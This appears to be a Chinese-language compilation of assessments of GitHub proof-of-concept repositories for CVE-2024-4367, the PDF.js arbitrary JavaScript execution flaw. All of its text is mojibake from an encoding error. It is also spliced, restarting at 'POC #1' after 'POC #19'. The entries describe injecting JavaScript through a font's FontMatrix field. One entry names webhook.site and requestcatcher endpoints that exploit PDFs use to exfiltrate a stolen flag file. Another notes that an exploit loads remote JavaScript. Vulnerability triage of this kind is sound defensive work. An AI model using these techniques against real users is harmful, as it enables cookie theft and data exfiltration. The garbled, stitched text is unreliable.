è¯¥ä»“åº“åŒ…å«ä¸€ä¸ª PDF PoC,ä¸€ä¸ª LICENSE æ–‡ä»¶ï¼Œå’Œä¸€ä¸ª READMEã€‚LICENSE æ–‡ä»¶å’Œ README æ–‡ä»¶æœ¬èº«æ²¡æœ‰é£é™©ã€‚è™½ç„¶PoCä»£ç èƒ½ç›´æ¥åˆ©ç”¨æ¼æ´ï¼Œä½†ä½œè€… Ahmad Kabiri çš„èº«ä»½æœªçŸ¥ï¼Œä¸”PoCçš„ç›®çš„æ˜¯å±•ç¤ºæ”»å‡»ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨å®é™…åˆ©ç”¨æ—¶ä¿®æ”¹æˆ–å¢åŠ payload, ä½†è¯¥ PoC æ–‡ä»¶æœ¬èº«ç›®çš„æ˜ç¡®ï¼Œç»“æ„ç®€å•ï¼Œéšè—æ¶æ„åé—¨ä»£ç å¯èƒ½æ€§è¾ƒä½ã€‚è€ƒè™‘åˆ°MITåè®®çš„å¼€æ”¾æ€§ä»¥åŠä½œè€…å·²çŸ¥çš„æ¼æ´ç ”ç©¶èƒŒæ™¯ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ åŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±éª—ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ (ä¾‹å¦‚, é€šè¿‡é’“é±¼é‚®ä»¶, æŒ‚é©¬ç½‘ç«™)ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ Firefox, Firefox ESR, Thunderbirdï¼‰çš„ PDF.js ç‰ˆæœ¬å­˜åœ¨æ¼æ´ï¼Œåˆ™æ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç å¯ä»¥åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–cookieã€localStorageæ•°æ®ã€sessionStorageæ•°æ®ï¼Œç”šè‡³è¿›è¡Œä¼šè¯åŠ«æŒç­‰ã€‚PoCä»£ç æ˜¾ç¤ºä¼šå¼¹å‡ºå¤šä¸ªalertæ¡†æ¥å±•ç¤ºè·å–åˆ°çš„ä¿¡æ¯.

**é¡¹ç›®åœ°å€:** [inpentest/CVE-2024-4367-PoC](https://github.com/inpentest/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #18

**æ¥æº**: [CVE-2024-4367-m0d0ri205_PDFJS.md](../2024/CVE-2024-4367-m0d0ri205_PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-Arbitrary-JavaScript-Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS) å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Mozilla Firefox, Firefox ESR å’Œ Thunderbird ä¸­çš„é«˜å±æ¼æ´ã€‚è¯¥æ¼æ´æºäº PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨ç‰ˆæœ¬æ‰“å¼€åŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç å°†è¢«æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS), è·å–æ•æ„Ÿä¿¡æ¯ç­‰é£é™©ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ¼æ´åˆ©ç”¨ä»£ç çš„ç›®çš„æ˜¯æ­å»ºä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç¯å¢ƒæ¥æµ‹è¯• CVE-2024-4367 ã€‚ docker-compose.yml å’Œ Dockerfile ç”¨äºæ„å»ºä¸€ä¸ªåŒ…å« expressï¼Œmulter å’Œ pdfjs-dist çš„ node åº”ç”¨ã€‚ app.js æ¥æ”¶ä¸Šä¼ çš„ PDF æ–‡ä»¶ï¼Œå¹¶é€šè¿‡ pdfjs-dist åœ¨æµè§ˆå™¨ä¸­æ¸²æŸ“ã€‚å¦‚æœ PDF æ–‡ä»¶åŒ…å«æ¶æ„çš„ JavaScript ä»£ç ï¼Œé‚£ä¹ˆå®ƒå°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚å› æ­¤ï¼ŒPOC ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œæ˜¯æ­å»ºæ˜“å—æ”»å‡»ç¯å¢ƒï¼Œç„¶åéœ€è¦æ”»å‡»è€…æ„é€ ç‰¹æ®Šçš„PDFæ–‡ä»¶åˆ©ç”¨æ­¤æ¼æ´ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

åˆ†æäº†æä¾›çš„POCä»£ç ï¼Œå‘ç°å…¶ä¸­ `/deploy/app.js` ä¸­å­˜åœ¨è·å– `/flag` æ¥å£çš„é€»è¾‘ï¼Œä½†åªæœ‰å½“è¯·æ±‚æ¥è‡ª `127.0.0.1` æ—¶æ‰ä¼šè¿”å› `SF{FAKE_FLAG}`ã€‚è€Œ `/deploy/flag.txt` æ–‡ä»¶ä¸­åŒ…å«çœŸæ­£çš„ flag `flag{pdf_js_pdf}`ï¼Œè¿™ä¸ªflagå¯èƒ½æ„å‘³ç€çœŸå®çš„åˆ©ç”¨ã€‚å¦‚æœä½œè€…çš„æœ¬æ„æ˜¯è¿·æƒ‘ä½¿ç”¨è€…ä½¿ç”¨å‡çš„flagï¼Œä¸”ä½¿ç”¨è€…ä¸ä»”ç»†åˆ†æä»£ç ï¼Œå¯èƒ½ä¼šè¢«è¯¯å¯¼ã€‚ä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„è¿·æƒ‘æ€§ï¼Œä½†ä¸»è¦ç›®çš„æ˜¯æµ‹è¯•ï¼ŒæŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**

1.  æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨ PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼ŒåµŒå…¥æ¶æ„çš„ JavaScript ä»£ç ã€‚
2.  æ”»å‡»è€…å°†æ­¤æ¶æ„ PDF æ–‡ä»¶å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
3.  ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶ã€‚
4.  ç”±äºæ¼æ´çš„å­˜åœ¨ï¼Œæ¶æ„ JavaScript ä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚è¿™ä¸ª JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå– Cookieã€é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€ç”šè‡³æ‰§è¡Œå…¶ä»–æ”»å‡»ã€‚

åˆ©ç”¨è¯¥æ¼æ´çš„å…³é”®åœ¨äºæ„é€ ä¸€ä¸ªèƒ½å¤Ÿç»•è¿‡ PDF.js ç±»å‹æ£€æŸ¥çš„æ¶æ„ PDF æ–‡ä»¶ï¼Œå¹¶åµŒå…¥èƒ½å¤Ÿæ‰§è¡Œæ”»å‡»è€…æ‰€éœ€æ“ä½œçš„ JavaScript ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [m0d0ri205/PDFJS](https://github.com/m0d0ri205/PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #19

**æ¥æº**: [CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md)

# CVE-2024-4367

> ğŸ“¦ è¯¥CVEæœ‰ **23** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-4367-0xr2r_CVE-2024-4367.md](../2024/CVE-2024-4367-0xr2r_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶åï¼Œæ”»å‡»è€…çš„JavaScriptä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº†PDF.jså­—ä½“å¤„ç†ä¸­ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼Œå°†JavaScriptä»£ç æ³¨å…¥åˆ°PDFæ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨æ‰“å¼€è¯¥æ–‡ä»¶æ—¶æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**
è™½ç„¶POCä»£ç æœ¬èº«æ˜¯ä¸ºäº†éªŒè¯æ¼æ´çš„å­˜åœ¨ï¼Œä½†ä»“åº“ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚POCä»£ç çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„PDFæ–‡ä»¶ï¼Œå…¶ç›®çš„æ˜¯è§¦å‘æ¼æ´ã€‚ä½†mali.pdfå¯èƒ½å­˜åœ¨éé¢„æœŸä»£ç çš„é£é™©ã€‚å› æ­¤ï¼Œé£é™©è¯„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†æ¶æ„PDFæ–‡ä»¶å‘é€ç»™å—å®³è€…ï¼Œæˆ–è€…å°†å…¶æ‰˜ç®¡åœ¨ç½‘ç«™ä¸Šè¯±å¯¼å—å®³è€…ä¸‹è½½ã€‚
3.  å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
4.  PDF.jsè§£æPDFæ–‡ä»¶æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„JavaScriptä»£ç è¢«æ‰§è¡Œã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**é¡¹ç›®åœ°å€:** [0xr2r/CVE-2024-4367](https://github.com/0xr2r/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #2

**æ¥æº**: [CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md](../2024/CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox/Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚\n\n**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**\næä¾›çš„ POC ä»£ç æ˜¯ä¸€ä¸ª PDF æ–‡ä»¶ï¼Œå®ƒé€šè¿‡æ„é€ æ¶æ„çš„ Type1 å­—ä½“ï¼Œåœ¨ `FontMatrix` å­—æ®µä¸­æ³¨å…¥ JavaScript ä»£ç  `prompt("1337rokudenashi");`ã€‚å½“ PDF.js è§£æè¯¥ PDF æ–‡ä»¶å¹¶å¤„ç†è¯¥å­—ä½“æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥ POC ä»£ç åº”è¯¥æœ‰æ•ˆï¼Œå¯ä»¥è§¦å‘æ¼æ´ã€‚\n\n**æŠ•æ¯’é£é™©åˆ†æï¼š**\næŸ¥çœ‹æä¾›çš„ POC ä»£ç ï¼Œå…¶ä¸­ `prompt("1337rokudenashi");` è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå¯ä»¥ç¡®è®¤POCæœ‰æ•ˆï¼Œä½†æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„è¡Œä¸ºï¼Œä¸å±äºåé—¨ä»£ç ã€‚å…¶ä½™çš„PDFç»“æ„ä»£ç æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆéƒ¨åˆ†ï¼Œä¹Ÿæ²¡æœ‰å‘ç°éšè—çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚ å› æ­¤ï¼Œå¯ä»¥è®¤ä¸ºè¯¥ POC ä»£ç ä¸å­˜åœ¨æŠ•æ¯’é£é™©ã€‚\n\n**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**\n1.  **æ„é€ æ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ Type 1 å­—ä½“çš„ PDF æ–‡ä»¶ã€‚å…³é”®åœ¨äº `FontMatrix` å­—æ®µï¼Œæ”»å‡»è€…åœ¨è¯¥å­—æ®µä¸­æ’å…¥ JavaScript ä»£ç ã€‚\n2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±ä½¿ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚\n3.  **æ‰§è¡Œ JavaScript ä»£ç ï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚åœ¨å¤„ç†åˆ°æ¶æ„ Type 1 å­—ä½“æ—¶ï¼Œ`FontMatrix` å­—æ®µä¸­çš„ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚\n4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´åï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä¾‹å¦‚çªƒå– Cookieã€è·å–æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚

**é¡¹ç›®åœ°å€:** [1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf](https://github.com/1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #3

**æ¥æº**: [CVE-2024-4367-BektiHandoyo_cve-pdf-host.md](../2024/CVE-2024-4367-BektiHandoyo_cve-pdf-host.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€XSSæ”»å‡»å’Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ„é€ æ¶æ„PDFï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡æ¡£ã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç  `exploit.pdf` å’Œ `poc.pdf` æ¥çœ‹ï¼Œæ”»å‡»è€…åœ¨PDFçš„å­—ä½“å¯¹è±¡ä¸­åµŒå…¥ JavaScript ä»£ç ã€‚ å…·ä½“æ¥è¯´ï¼Œä»£ç è¢«åµŒå…¥åˆ° `/Font` å¯¹è±¡çš„ `/FontMatrix` å±æ€§ä¸­ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡ç±»å‹æ£€æŸ¥ã€‚
2.  **è§¦å‘æ¼æ´ï¼š** å½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡æ¡£æ—¶ï¼ŒPDF.js ä¼šå°è¯•æ¸²æŸ“å­—ä½“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚
3.  **ä»£ç æ‰§è¡Œï¼š**  åµŒå…¥çš„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œã€‚ åœ¨æä¾›çš„ POC ä»£ç ä¸­ï¼Œæ¶æ„ JavaScript ä»£ç çš„ç›®çš„æ˜¯çªƒå–ä½äº `/app/admin/flag.pdf` çš„ flag æ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚
     *   `exploit.pdf`: å°† flag ä»¥ DataURL æ ¼å¼å‘é€åˆ° `https://ha.requestcatcher.com/`ã€‚
     *   `poc.pdf`:  å°† flag ä»¥æ–‡ä»¶æ ¼å¼å‘é€åˆ° `https://webhook.site/134021d3-88f1-44a6-aa82-e48e33247fcc`ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æ ¹æ®å¯¹æä¾›çš„ä¸¤ä¸ª PDF æ–‡ä»¶çš„åˆ†æï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä¸¤ä¸ª PDF æ–‡ä»¶ä¸­çš„ JavaScript ä»£ç éƒ½æ—¨åœ¨åˆ©ç”¨æ¼æ´çªƒå– flagï¼Œå¹¶å°† flag æ•°æ®å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨è¿›è¡Œ exfiltrationã€‚ æ²¡æœ‰å‘ç°å…¶ä»–éšè—çš„æ¶æ„è¡Œä¸ºæˆ–åé—¨ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„ POC ä»£ç åˆ©ç”¨äº† PDF.js åœ¨å­—ä½“å¤„ç†ä¸­ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±æ¼æ´ã€‚ æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å…è®¸æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ å› æ­¤ï¼ŒPOC ä»£ç **æœ‰æ•ˆ**ã€‚

**é¡¹ç›®åœ°å€:** [BektiHandoyo/cve-pdf-host](https://github.com/BektiHandoyo/cve-pdf-host)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #4

**æ¥æº**: [CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md](../2024/CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js, Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** PDF.js < 4.2.67, Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„é«˜å±æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ç‰¹åˆ¶çš„ PDF æ–‡ä»¶æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ `fontMatrix` æ•°ç»„ä¸­çš„æ¼æ´ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ° PDF æ–‡ä»¶ä¸­ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ PDF.js ç‰ˆæœ¬ï¼ˆå¦‚ Firefox 126 ä¹‹å‰çš„ç‰ˆæœ¬ï¼‰æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚è¿™å¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼Œæˆ–è€…å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œç”šè‡³å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„POCä»£ç ï¼ˆ`ex1.pdf` å’Œ `ex-gist.pdf`ï¼‰é€šè¿‡æ„é€ æ¶æ„çš„`fontMatrix`æ•°æ®ï¼Œè¯æ˜äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚`ex1.pdf`è§¦å‘alertï¼Œ`ex-gist.pdf`ç”šè‡³å¯ä»¥ä»è¿œç¨‹åœ°å€åŠ è½½å¹¶æ‰§è¡ŒJavaScriptï¼ŒéªŒè¯äº†æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** è™½ç„¶è¯¥é¡¹ç›®æä¾›äº†æ¼æ´åˆ©ç”¨çš„PoCï¼Œä½†æ˜¯æ£€æŸ¥äº†ä»“åº“ä¸­çš„å…¶ä»–æ–‡ä»¶ï¼Œå¦‚`astro.config.mjs`å’Œ`package-lock.json`ç­‰é…ç½®æ–‡ä»¶ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ é£é™©ä¸»è¦å­˜åœ¨äºå¦‚æœä¸‹è½½è¯¥é¡¹ç›®å¹¶åœ¨å—ä¿¡ä»»çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œè¿œç¨‹åŠ è½½çš„jsæ–‡ä»¶åŒ…å«æ¶æ„payloadçš„å¯èƒ½æ€§ï¼Œå› æ­¤æ¨æµ‹æŠ•æ¯’é£é™©è¾ƒä½ï¼Œé¢„ä¼°ä¸º10%ã€‚

